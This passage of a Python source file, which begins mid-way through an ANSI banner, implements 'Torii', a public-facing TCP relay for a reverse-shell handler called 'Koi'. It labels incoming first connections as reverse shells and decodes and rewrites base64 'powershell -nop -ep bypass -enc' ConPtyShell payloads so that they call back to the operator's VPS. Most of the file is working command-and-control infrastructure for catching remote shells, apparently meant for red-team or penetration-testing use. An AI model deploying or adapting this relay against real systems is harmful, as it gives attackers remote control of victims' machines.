25))}⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((41, 41, 41))}⢤{color_signal((65, 65, 65))}⣦⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((70, 22, 20))}⠸{color_signal((161, 37, 34))}⣾{color_signal((109, 31, 27))}⡦{color_signal((110, 88, 78))}⠙{color_signal((168, 133, 101))}⠿{color_signal((241, 196, 148))}⣿{color_signal((243, 220, 190))}⣿{color_signal((249, 239, 215))}⣿{color_signal((252, 242, 222))}⣿{color_signal((178, 177, 167))}⣧{color_signal((23, 23, 21))}⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((166, 37, 33))}⣿{color_signal((237, 41, 39))}⣿{color_signal((165, 35, 32))}⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((13, 13, 13))}⠁⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{color_signal((11, 11, 10))}⠈{color_signal((58, 56, 52))}⠉{color_signal((89, 84, 77))}⠛{color_signal((110, 108, 100))}⠛{color_signal((127, 123, 112))}⠛{color_signal((95, 94, 90))}⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{RST_local}
"""
    print(art)
    if version:
        name = f"{BOLD}{color_signal((235, 38, 38))}TORII{RST_local}" if tty else "TORII"
        ver = f"{color_signal((140, 140, 140))}  v{version}{RST_local}" if tty else f"  v{version}"
        print(f"                              {name}{ver}\n")


# ============================================================================
# Protocol Handling
# ============================================================================

class ToriiProtocol:
    """Torii protocol constants and utilities"""
    TYPE_SHELL = 0x01
    TYPE_SIDECHANNEL = 0x02
    HEADER_SIZE = 3

    @staticmethod
    def parse_header(data: bytes) -> tuple[int, int] | None:
        if len(data) < ToriiProtocol.HEADER_SIZE:
            return None
        conn_type = data[0]
        target_port = struct.unpack(">H", data[1:3])[0]
        if conn_type not in (ToriiProtocol.TYPE_SHELL, ToriiProtocol.TYPE_SIDECHANNEL):
            return None
        if not (1 <= target_port <= 65535):
            return None
        return (conn_type, target_port)

    @staticmethod
    def get_type_name(conn_type: int) -> str:
        names = {
            ToriiProtocol.TYPE_SHELL: "Shell",
            ToriiProtocol.TYPE_SIDECHANNEL: "SideChannel",
        }
        return names.get(conn_type, f"Unknown(0x{conn_type:02x})")

    @staticmethod
    def create_header(conn_type: int, target_port: int) -> bytes:
        if conn_type not in (ToriiProtocol.TYPE_SHELL, ToriiProtocol.TYPE_SIDECHANNEL):
            raise ValueError(f"Invalid connection type: {conn_type}")
        if not (1 <= target_port <= 65535):
            raise ValueError(f"Invalid port: {target_port}")
        return bytes([conn_type]) + struct.pack(">H", target_port)


# ============================================================================
# Address Interception
# ============================================================================

class AddressInterceptor:
    """Intercepts and rewrites IP:port addresses in data streams"""

    def __init__(self, vps_host: str, vps_port: int, localhost_host: str = "127.0.0.1"):
        self.vps_host = vps_host
        self.vps_port = vps_port
        self.localhost_host = localhost_host
        self.logger = logging.getLogger("torii.interceptor")

        self._slash_pattern = re.compile(rb'(?:127\.0\.0\.1|localhost)/(\d+)', re.IGNORECASE)
        self._quoted_comma_pattern = re.compile(rb"""['"](?:127\.0\.0\.1|localhost)['"]\s*,\s*(\d+)""", re.IGNORECASE)
        self._colon_pattern = re.compile(rb'(?:127\.0\.0\.1|localhost):(\d+)', re.IGNORECASE)

    def _rewrite_base64_powershell(self, data: bytes) -> bytes | None:
        try:
            if b'powershell' not in data:
                return None
            match = re.search(rb'powershell\s+-nop\s+-ep\s+bypass\s+-enc\s+([A-Za-z0-9+/=]+)', data, re.IGNORECASE)
            if not match:
                self.logger.debug(f"No powershell pattern found in {len(data)} bytes")
                return None
            self.logger.debug("Found powershell -nop -ep bypass -enc pattern")
            b64_payload = match.group(1)
            try:
                decoded = base64.b64decode(b64_payload)
                decoded_str = decoded.decode('utf-16-le')
                self.logger.debug(f"Decoded base64: {decoded_str[:100]}...")
            except Exception as e:
                self.logger.debug(f"Failed to decode base64: {e}")
                return None
            if b'-RemoteIp' not in decoded_str.encode('utf-8'):
                self.logger.debug("No -RemoteIp found in decoded payload")
                return None
            if not re.search(r'-RemoteIp\s+127\.0\.0\.1\s+-RemotePort\s+(\d+)', decoded_str):
                self.logger.debug("Pattern -RemoteIp 127.0.0.1 -RemotePort not found, skipping")
                return None
            self.logger.debug("Found conptyshell pattern, rewriting...")
            modified_str = re.sub(
                r'-RemoteIp\s+127\.0\.0\.1\s+-RemotePort\s+(\d+)',
                f'-RemoteIp {self.vps_host} -RemotePort {self.vps_port}',
                decoded_str
            )
            modified_bytes = modified_str.encode('utf-16-le')
            new_b64 = base64.b64encode(modified_bytes).decode('ascii')
            new_data = data[:match.start(1)] + new_b64.encode() + data[match.end(1):]
            self.logger.info(f"Rewrote conptyshell payload: 127.0.0.1:4010 → {self.vps_host}:{self.vps_port}")
            return new_data
        except Exception as e:
            self.logger.debug(f"Failed to rewrite base64 payload: {e}")
            return None

    def rewrite_and_track(self, data: bytes, on_port_found) -> bytes:
        if not data:
            return data

        rewritten = self._rewrite_base64_powershell(data)
        if rewritten is not None:
            return rewritten

        vps_host_b = self.vps_host.encode()
        vps_port_b = str(self.vps_port).encode()

        def track(match) -> None:
            try:
                on_port_found(int(match.group(1)))
            except Exception:
                pass

        def slash_repl(match):
            track(match)
            return vps_host_b + b"/" + vps_port_b

        def quoted_comma_repl(match):
            track(match)
            return b"'" + vps_host_b + b"'," + vps_port_b

        def colon_repl(match):
            track(match)
            return vps_host_b + b":" + vps_port_b

        data = self._slash_pattern.sub(slash_repl, data)
        data = self._quoted_comma_pattern.sub(quoted_comma_repl, data)
        data = self._colon_pattern.sub(colon_repl, data)
        return data


# ============================================================================
# Relay Engine
# ============================================================================

BUFFER_SIZE = 65536

class BidirectionalRelay:
    """Handles bidirectional data relay between two sockets"""

    def __init__(self, client_sock: socket.socket, koi_sock: socket.socket,
                 on_close: Callable[[], None] = None,
                 interceptor: Callable[[bytes], bytes] | None = None,
                 buffered_data: bytes = b"", conn_id: str = "?"):
        self.client_sock = client_sock
        self.koi_sock = koi_sock
        self.on_close = on_close or (lambda: None)
        self.interceptor = interceptor
        self.active = True
        self.buffered_data = buffered_data
        self.conn_id = conn_id
        self.logger = logging.getLogger("torii.relay")

    def start(self) -> None:
        if self.buffered_data:
            try:
                self.koi_sock.sendall(self.buffered_data)
                self.logger.debug(f"[{self.conn_id}] Sent buffered data to Koi ({len(self.buffered_data)} bytes)")
            except Exception as e:
                self.logger.error(f"[{self.conn_id}] Failed to send buffered data: {e}")

        t1 = threading.Thread(target=self._relay, args=(self.client_sock, self.koi_sock, "client→koi"), daemon=True)
        t2 = threading.Thread(target=self._relay, args=(self.koi_sock, self.client_sock, "koi→client", self.interceptor), daemon=True)
        t1.start()
        t2.start()

    def _relay(self, from_sock: socket.socket, to_sock: socket.socket, direction: str,
               interceptor: Callable[[bytes], bytes] | None = None) -> None:
        tag = f"[{self.conn_id}] {direction}"
        try:
            while self.active:
                data = from_sock.recv(BUFFER_SIZE)
                if not data:
                    self.logger.debug(f"{tag}: Connection closed")
                    break
                self.logger.debug(f"{tag}: {len(data)} bytes: {data[:200]!r}")
                if interceptor:
                    data = interceptor(data)
                try:
                    to_sock.sendall(data)
                except (BrokenPipeError, OSError):
                    self.logger.debug(f"{tag}: Failed to send data")
                    break
        except Exception as e:
            self.logger.debug(f"{tag}: Relay error: {e}")
        finally:
            self.active = False
            self._cleanup()

    def _cleanup(self) -> None:
        for sock in (self.client_sock, self.koi_sock):
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
        try:
            self.client_sock.close()
        except OSError:
            pass
        try:
            self.koi_sock.close()
        except OSError:
            pass
        self.on_close()


# ============================================================================
# Debug Utilities
# ============================================================================

_pidfile_path = None

def get_pidfile_path() -> Path:
    return Path.home() / ".cache" / "torii" / "torii.pid"

def write_pidfile(torii_instance) -> None:
    global _pidfile_path
    pidfile = get_pidfile_path()
    pidfile.parent.mkdir(parents=True, exist_ok=True)
    try:
        with open(pidfile, "w") as f:
            f.write(str(os.getpid()))
        _pidfile_path = pidfile
    except Exception:
        pass

def cleanup_pidfile() -> None:
    if _pidfile_path:
        try:
            _pidfile_path.unlink()
        except OSError:
            pass

def setup_signal_handlers(torii_instance) -> None:
    write_pidfile(torii_instance)



# ============================================================================
# Core Torii Server
# ============================================================================

class Torii:
    """Main Torii multiplexing relay class"""

    def __init__(self, listen_host: str = "0.0.0.0", listen_port: int = 443,
                 koi_host: str = "127.0.0.1", koi_port: int = 4010,
                 enable_interceptor: bool = True, public_host: str | None = None):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.koi_host = koi_host
        self.koi_port = koi_port
        self.public_host = public_host
        self.enable_interceptor = enable_interceptor
        self.server_socket = None
        self.running = False
        self.active_connections = []
        self._mode_lock = threading.Lock()
        self._connection_count = OrderedDict()
        self._pending_sidechannels: dict[str, int] = {}
        self.logger = logging.getLogger("torii.core")

        self.interceptor = None
        if enable_interceptor:
            resolved_host = public_host or listen_host
            if resolved_host in ("0.0.0.0", ""):
                self.logger.warning("No --public-host given and listen host is 0.0.0.0")
                resolved_host = "localhost"
            self.interceptor = AddressInterceptor(vps_host=resolved_host, vps_port=listen_port)

    def start(self) -> None:
        try:
            setup_signal_handlers(self)

            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.listen_host, self.listen_port))
            self.server_socket.listen(10)
            self.running = True
            self.logger.info(f"Torii listening on {self.listen_host}:{self.listen_port}")
            self.logger.info(f"Forwarding to Koi at {self.koi_host}:{self.koi_port}")

            while self.running:
                try:
                    self.server_socket.settimeout(1.0)
                    client_sock, addr = self.server_socket.accept()
                    self.logger.info(f"New connection from {addr[0]}:{addr[1]}")
                    thread = threading.Thread(target=self._handle_client, args=(client_sock, addr), daemon=True)
                    thread.start()
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        self.logger.error(f"Error accepting connection: {e}")
        except OSError as e:
            self.logger.error(f"Failed to bind to {self.listen_host}:{self.listen_port}: {e}")
            raise
        finally:
            self.stop()

    def stop(self) -> None:
        self.logger.info("Stopping Torii...")
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except OSError:
                pass
        cleanup_pidfile()

    def _track_connection(self, client_ip: str) -> int:
        with self._mode_lock:
            count = self._connection_count.get(client_ip, 0) + 1
            self._connection_count[client_ip] = count
            if len(self._connection_count) > 100000:
                self._connection_count.popitem(last=False)
            return count

    def _register_sidechannel(self, client_ip: str, port: int) -> None:
        with self._mode_lock:
            self._pending_sidechannels[client_ip] = port
        self.logger.info(f"Detected side-channel command for {client_ip} → Koi:{port}")

    def _consume_sidechannel(self, client_ip: str) -> int | None:
        with self._mode_lock:
            return self._pending_sidechannels.pop(client_ip, None)

    def _handle_client(self, client_sock: socket.socket, addr: tuple) -> None:
        client_id = f"{addr[0]}:{addr[1]}"
        client_ip = addr[0]

        try:
            conn_num = self._track_connection(client_ip)
            self.logger.debug(f"[{client_id}] Connection #{conn_num} from {client_ip}")

            if conn_num == 1:
                self.logger.info(f"[{client_id}] Connection #1 (reverse shell)")
                buffered_data = client_sock.recv(ToriiProtocol.HEADER_SIZE)
                if not buffered_data:
                    self.logger.warning(f"[{client_id}] No data received")
                    client_sock.close()
                    return

                parsed = ToriiProtocol.parse_header(buffered_data)
                if parsed:
                    conn_type, target_port = parsed
                    type_name = ToriiProtocol.get_type_name(conn_type)
                    self.logger.debug(f"[{client_id}] Parsed header: {type_name} → port {target_port}")
                else:
                    target_port = self.koi_port
                    self.logger.warning(f"[{client_id}] Invalid header, using default Koi:{target_port}")
                self.logger.info(f"[{client_id}] → Koi:{target_port}")
            else:
                pending_port = self._consume_sidechannel(client_ip)
                if pending_port:
                    target_port = pending_port
                    self.logger.info(f"[{client_id}] Connection #{conn_num} → Koi:{target_port} (side-channel)")
                else:
                    target_port = self.koi_port
                    self.logger.warning(f"[{client_id}] Connection #{conn_num} → Koi:{target_port} (no side-channel found, using default port)")
                buffered_data = b""

            koi_sock = None
            try:
                koi_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                koi_sock.connect((self.koi_host, target_port))
                self.logger.debug(f"[{client_id}] Connected to Koi:{target_port}")
            except Exception as e:
                self.logger.error(f"[{client_id}] Failed to connect to Koi:{target_port}: {e}")
                if koi_sock:
                    try:
                        koi_sock.close()
                    except:
                        pass
                client_sock.close()
                return

            interceptor_func = None
            if self.enable_interceptor and self.interceptor and conn_num == 1:
                def intercept(data: bytes) -> bytes:
                    return self.interceptor.rewrite_and_track(
                        data,
                        on_port_found=lambda port: self._register_sidechannel(client_ip, port),
                    )
                interceptor_func = intercept

            relay = BidirectionalRelay(
                client_sock=client_sock,
                koi_sock=koi_sock,
                on_close=lambda: self.logger.debug(f"[{client_id}] Relay closed"),
                interceptor=interceptor_func,
                buffered_data=buffered_data or b"",
                conn_id=f"{client_id} #{conn_num}",
            )

            relay.start()

            while relay.active:
                try:
                    threading.Event().wait(0.1)
                except KeyboardInterrupt:
                    break

        except Exception as e:
            self.logger.error(f"[{client_id}] Error handling connection: {e}", exc_info=True)
        finally:
            try:
                client_sock.close()
            except OSError:
                pass


# ============================================================================
# CLI Entry Point
# ============================================================================

DEFAULT_LOG_FILE = Path.home() / ".cache" / "torii" / "torii.log"

def main():
    parser = argparse.ArgumentParser(
        description="Torii - Multiplexing TCP relay proxy for Koi",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Local testing
  python3 torii.py --listen 127.0.0.1:4010 --koi 127.0.0.1:4010

  # Online deployment on VPS
  python3 torii.py --listen 0.0.0.0:443 --koi 127.0.0.1:4010
        """
    )

    parser.add_argument("--listen", default="0.0.0.0:443",
                        help="Address and port to listen on (default: 0.0.0.0:443)")
    parser.add_argument("--koi", default="127.0.0.1:4010",
                        help="Koi address and port (default: 127.0.0.1:4010)")
    parser.add_argument("--public-host", default=None,
                        help="Public IP/hostname for interceptor rewriting")
    parser.add_argument("--log", choices=["DEBUG", "INFO", "WARN", "ERROR"], default="INFO",
                        help="Log level (default: INFO)")
    parser.add_argument("--log-file", default=str(DEFAULT_LOG_FILE),
                        help=f"Log file path (default: {DEFAULT_LOG_FILE})")
    parser.add_argument("--tail-log", nargs="?", const=200, type=int, default=None, metavar="N",
                        help="Print last N lines of log file and exit")
    parser.add_argument("--interceptor", action="store_true", default=True,
                        help="Enable address interception (default: enabled)")
    parser.add_argument("--no-interceptor", dest="interceptor", action="store_false",
                        help="Disable address interception")

    args = parser.parse_args()

    if args.tail_log is not None:
        log_path = Path(args.log_file or DEFAULT_LOG_FILE).expanduser()
        if not log_path.exists():
            print(f"No log file at {log_path}", file=sys.stderr)
            sys.exit(1)
        lines = log_path.read_text().splitlines()
        for line in lines[-args.tail_log:]:
            print(line)
        return

    log_level = getattr(logging, args.log)
    plain_format = '%(asctime)s [%(levelname)s] %(name)s: %(message)s'

    stream_handler = logging.StreamHandler()
    stream_handler.setFormatter(ColorFormatter())
    handlers = [stream_handler]

    if args.log_file:
        log_path = Path(args.log_file).expanduser()
        log_path.parent.mkdir(parents=True, exist_ok=True)
        file_handler = logging.FileHandler(log_path)
        file_handler.setFormatter(logging.Formatter(plain_format))
        handlers.append(file_handler)

    logging.basicConfig(level=log_level, handlers=handlers)

    logger = logging.getLogger("torii.cli")
    if args.log_file:
        logger.info(f"Also logging to file: {Path(args.log_file).expanduser()}")

    try:
        listen_host, listen_port = args.listen.rsplit(":", 1)
        listen_port = int(listen_port)
    except ValueError:
        logger.error(f"Invalid listen address: {args.listen}")
        sys.exit(1)

    try:
        koi_host, koi_port = args.koi.rsplit(":", 1)
        koi_port = int(koi_port)
    except ValueError:
        logger.error(f"Invalid Koi address: {args.koi}")
        sys.exit(1)

    display_art(__version__)
    notify("info", f"Listen: {accent(f'{listen_host}:{listen_port}')}")
    notify("info", f"Koi: {accent(f'{koi_host}:{koi_port}')}")
    notify("info", f"Public host: {accent(args.public_host or '(same as listen host)')}")
    notify("status", f"Interceptor: {'enabled' if args.interceptor else muted('disabled')}")
    print()

    try:
        torii = Torii(
            listen_host=listen_host,
            listen_port=listen_port,
            koi_host=koi_host,
            koi_port=koi_port,
            enable_interceptor=args.interceptor,
            public_host=args.public_host,
        )
        torii.start()
    except KeyboardInterrupt:
        logger.info("Shutting down...")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()